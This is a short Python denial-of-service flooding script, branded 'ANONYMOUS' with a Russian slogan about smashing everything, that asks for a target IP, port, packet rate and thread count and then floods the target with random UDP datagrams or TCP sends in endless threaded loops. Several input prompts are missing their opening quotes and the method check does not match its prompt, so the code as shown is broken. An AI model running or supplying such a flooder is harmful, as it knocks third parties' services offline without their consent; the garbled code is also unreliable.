import random
import socket
import threading
import os
import sys
import time
import ssl
import datetime
#Colour
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'
##############

os.system("clear")

print("""\033[93m
              ANONYMOUS
      ╭━━━╮      ╭╮ ╭━━━╮
      ┃╭━━╯      ┃┃ ╰╮╭╮┃
      ┃╰━━┳╮╭┳━━┫┃╭╮┃┃┃┣━━┳━━╮
      ┃╭━━┫┃┃┃╭━┫╰╯╯┃┃┃┃╭╮┃━━┫
      ┃┃  ┃╰╯┃╰━┫╭╮┳╯╰╯┃╰╯┣━━┃v2.3
      ╰╯  ╰━━┻━━┻╯╰┻━━━┻━━┻━━╯
          Разнеси всех и вся 💥
""")
time.sleep(2)
print()
choice = str(input(\033[91m ╠═══['\033[94m МЕТОД [×] METHODS {UDP/TCP) ]•\n ╚════\033[92m> \033[0m"))
time.sleep(1)
ip = str(input(\033[91m ╠═══['\033[94m Ваша Цель IP ]\033[91m•\n ╚════'\033[92m> \033[0m"))
time.sleep(1)
port = int(input(\033[91m ╠═══['\033[94m ПОРТ [×] PORT ]\033[91m•\n ╚════'\033[92m> \033[0m"))
time.sleep(1)
times = int(input(\033[91m ╠═══['\033[94m ПАКЕТЫ/s [×] PACKETS ]\033[91m•\n ╚════'\033[92m> \033[0m"))
time.sleep(1)
threads = int(input(\033[91m ╠═══['\033[94m ПОТОКИ [800] THREAD ]\033[91m•\n ╚════'\033[92m> \033[0m"))
time.sleep(2)
os.system('cls' if os.name=='nt' else 'clear')

def run():
  data = random._urandom(65534)
  i = random.choice(("[+]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +"\033[93m ΣX Attack Dd0s")
    except:
      print(" DOWN!!")

def run2():
  data = random._urandom(818)
  i = random.choice(("[+]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" ΣX !!!")
    except:
      s.close()
      print("\033[91m[*] Error")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()
